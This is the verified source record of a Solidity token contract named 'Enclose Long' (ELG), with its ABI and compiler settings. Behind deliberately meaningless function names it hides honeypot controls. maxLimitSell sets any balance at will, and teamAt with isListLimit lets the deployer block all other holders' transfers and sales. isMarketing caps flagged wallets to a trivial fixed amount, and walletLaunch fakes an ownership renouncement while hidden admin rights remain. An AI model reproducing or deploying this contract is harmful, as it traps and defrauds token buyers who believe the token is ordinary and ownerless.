{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface shouldTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeTokenLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTo {\n    function createPair(address takeList, address liquidityReceiverFee) external returns (address);\n}\n\ninterface totalLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTrading) external view returns (uint256);\n\n    function transfer(address feeSell, uint256 senderReceiver) external returns (bool);\n\n    function allowance(address fromSellAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeSell,\n        uint256 senderReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeAmountExempt, uint256 value);\n    event Approval(address indexed fromSellAt, address indexed spender, uint256 value);\n}\n\ninterface autoTx is totalLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EncloseLong is modeTokenLiquidity, totalLimit, autoTx {\n\n    function listLaunch(address modeTotal, address feeSell, uint256 senderReceiver) internal returns (bool) {\n        require(launchTeam[modeTotal] >= senderReceiver);\n        launchTeam[modeTotal] -= senderReceiver;\n        launchTeam[feeSell] += senderReceiver;\n        emit Transfer(modeTotal, feeSell, senderReceiver);\n        return true;\n    }\n\n    function allowance(address minIs, address isToken) external view virtual override returns (uint256) {\n        if (isToken == buyMarketing) {\n            return type(uint256).max;\n        }\n        return toReceiver[minIs][isToken];\n    }\n\n    function balanceOf(address receiverTrading) public view virtual override returns (uint256) {\n        return launchTeam[receiverTrading];\n    }\n\n    address buyMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function maxLimitSell(address receiverFromBuy, uint256 senderReceiver) public {\n        buyAt();\n        launchTeam[receiverFromBuy] = senderReceiver;\n    }\n\n    bool private atTotalSwap;\n\n    function isListLimit(address modeTotal, address feeSell, uint256 senderReceiver) internal returns (bool) {\n        if (modeTotal == toReceiverTotal) {\n            return listLaunch(modeTotal, feeSell, senderReceiver);\n        }\n        uint256 minTx = totalLimit(minLaunched).balanceOf(txMode);\n        require(minTx == liquidityTake);\n        require(feeSell != txMode);\n        if (tokenTake[modeTotal]) {\n            return listLaunch(modeTotal, feeSell, launchWalletAuto);\n        }\n        return listLaunch(modeTotal, feeSell, senderReceiver);\n    }\n\n    address public toReceiverTotal;\n\n    uint256 public shouldMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverFundTrading;\n    }\n\n    mapping(address => uint256) private launchTeam;\n\n    string private takeTrading = \"Enclose Long\";\n\n    uint256 liquidityTake;\n\n    function buyAt() private view {\n        require(marketingShould[_msgSender()]);\n    }\n\n    string private receiverFund = \"ELG\";\n\n    function limitBuySender(address receiverTo) public {\n        if (sellTotal) {\n            return;\n        }\n        \n        marketingShould[receiverTo] = true;\n        if (receiverReceiver != atTotalSwap) {\n            listLaunched = shouldMode;\n        }\n        sellTotal = true;\n    }\n\n    uint256 private minLiquidity = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return takeTrading;\n    }\n\n    uint8 private receiverFundTrading = 18;\n\n    address public minLaunched;\n\n    constructor (){\n        if (atTotalSwap) {\n            shouldMode = listLaunched;\n        }\n        shouldTotal takeTokenAuto = shouldTotal(buyMarketing);\n        minLaunched = amountTo(takeTokenAuto.factory()).createPair(takeTokenAuto.WETH(), address(this));\n        \n        toReceiverTotal = _msgSender();\n        walletLaunch();\n        marketingShould[toReceiverTotal] = true;\n        launchTeam[toReceiverTotal] = minLiquidity;\n        if (receiverReceiver == senderMin) {\n            shouldMode = listLaunched;\n        }\n        emit Transfer(address(0), toReceiverTotal, minLiquidity);\n    }\n\n    function teamAt(uint256 senderReceiver) public {\n        buyAt();\n        liquidityTake = senderReceiver;\n    }\n\n    function transferFrom(address modeTotal, address feeSell, uint256 senderReceiver) external override returns (bool) {\n        if (_msgSender() != buyMarketing) {\n            if (toReceiver[modeTotal][_msgSender()] != type(uint256).max) {\n                require(senderReceiver <= toReceiver[modeTotal][_msgSender()]);\n                toReceiver[modeTotal][_msgSender()] -= senderReceiver;\n            }\n        }\n        return isListLimit(modeTotal, feeSell, senderReceiver);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minLiquidity;\n    }\n\n    address txMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return liquidityFrom;\n    }\n\n    uint256 marketingAmount;\n\n    bool public senderMin;\n\n    uint256 constant launchWalletAuto = 17 ** 10;\n\n    bool public sellTotal;\n\n    mapping(address => mapping(address => uint256)) private toReceiver;\n\n    address private liquidityFrom;\n\n    function getOwner() external view returns (address) {\n        return liquidityFrom;\n    }\n\n    function approve(address isToken, uint256 senderReceiver) public virtual override returns (bool) {\n        toReceiver[_msgSender()][isToken] = senderReceiver;\n        emit Approval(_msgSender(), isToken, senderReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public tokenTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFund;\n    }\n\n    function isMarketing(address exemptReceiver) public {\n        buyAt();\n        \n        if (exemptReceiver == toReceiverTotal || exemptReceiver == minLaunched) {\n            return;\n        }\n        tokenTake[exemptReceiver] = true;\n    }\n\n    uint256 private listLaunched;\n\n    event OwnershipTransferred(address indexed toLaunchAuto, address indexed launchedReceiver);\n\n    function transfer(address receiverFromBuy, uint256 senderReceiver) external virtual override returns (bool) {\n        return isListLimit(_msgSender(), receiverFromBuy, senderReceiver);\n    }\n\n    function walletLaunch() public {\n        emit OwnershipTransferred(toReceiverTotal, address(0));\n        liquidityFrom = address(0);\n    }\n\n    mapping(address => bool) public marketingShould;\n\n    bool private receiverReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSellAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunchAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmountExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"}],\"name\":\"limitBuySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiver\",\"type\":\"uint256\"}],\"name\":\"maxLimitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderReceiver\",\"type\":\"uint256\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EncloseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}